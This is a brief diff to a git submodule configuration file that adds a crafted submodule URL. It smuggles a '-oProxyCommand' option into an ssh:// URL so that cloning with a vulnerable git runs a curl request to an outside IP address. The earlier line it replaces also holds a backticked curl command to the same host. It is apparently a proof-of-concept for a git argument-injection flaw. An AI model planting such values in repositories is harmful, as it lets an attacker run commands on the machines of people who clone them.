@@ -1,4 +1,3 @@
 [submodule "test"]
 	path = test
-	url = `curl http://47.104.137.66:10080/index.php`
-
+	url = `ssh://-oProxyCommand=curl http://47.104.137.66:10080/index.php`
